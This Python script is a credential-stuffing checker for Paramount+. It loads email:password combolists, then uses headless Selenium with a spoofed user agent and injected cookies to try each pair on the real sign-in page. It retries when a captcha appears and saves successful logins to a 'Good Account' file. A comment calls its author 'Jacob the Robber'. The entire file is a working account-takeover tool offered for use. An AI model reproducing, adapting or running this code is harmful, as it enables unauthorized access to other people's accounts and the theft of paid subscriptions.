import time
import os

from modules.save_cookies import GenerateCookies
from combo_splitters.split_combos import ComboSplitter
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.options import Options
from titles.paramount_title import title
from modules.connection_error import connection_error_try_block as ip_country
from pathlib import Path


def paramount_():
    title()
    file_directory = str(Path(__file__).parents[1])+'/combolists/paramount'
    plain_directory = str(Path(__file__).parents[1])
    ip_country("paramount")
    page = 'https://www.paramountplus.com/account/signin/'
    splitter = ComboSplitter(file_directory, "paramount")
    try:
        users, passwords = splitter.split_file()
    except TypeError:
        splitter.return_error(plain_directory + "/combolists")
        exit()
    index = 0
    browser_options = Options()
    browser_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')
    browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
    browser_options.add_argument('--headless=new')
    while index < len(users):
        os.makedirs(plain_directory + "/accounts", exist_ok=True)
        with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
            try:
                print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
                grab_cookies = GenerateCookies(page, plain_directory, 'paramount')
                grab_cookies.create_headers()
                cookies_dict = grab_cookies.create_cookies()
                browser = webdriver.Chrome(options=browser_options)
                browser.set_window_size(500, 700)
                browser.get(page)
                time.sleep(5)
                # a6121399-6ef9-447e-8653-8e223168a398 💀 Jacob the Robber!
                for (k, v) in cookies_dict.items():
                    browser.add_cookie({'name': k, 'value': v})
                email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
                password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
                sign_in_button = browser.find_element(By.XPATH, '//*[@id="sign-in-form"]/div/div[3]/button')
                email_input_box.send_keys(users[index])
                password_input_box.send_keys(passwords[index])
                sign_in_button.click()
                time.sleep(4)
                if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
                    print(' -- Error: Captcha. Iteration index not increased'.format(users[index], passwords[index]))
                    continue
                if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p'):
                    invalid_email_text = browser.find_element(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p').text
                    if 'Invalid email and/or password' in str(invalid_email_text):
                        print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
                        index +=1
                        continue
                if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p'):
                    error = browser.find_element(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p').text
                    if 'try again later' in error:
                        print(' -- {}:{} ---> Please try again later'.format(users[index], passwords[index]))
                if 'home' in str(browser.current_url):
                    print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
                    account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
                if 'user-profile/whos-watching' in browser.current_url:
                        print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
                        account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
                browser.close()
                index += 1
            except (ElementClickInterceptedException, NoSuchElementException):
                print(' -- Error: Click Intercepted')
                browser.close()
            except TimeoutException:
                print(' -- Timed out. Index not incremented.')
                browser.close()
            except Exception as e:
                print(e)
                break
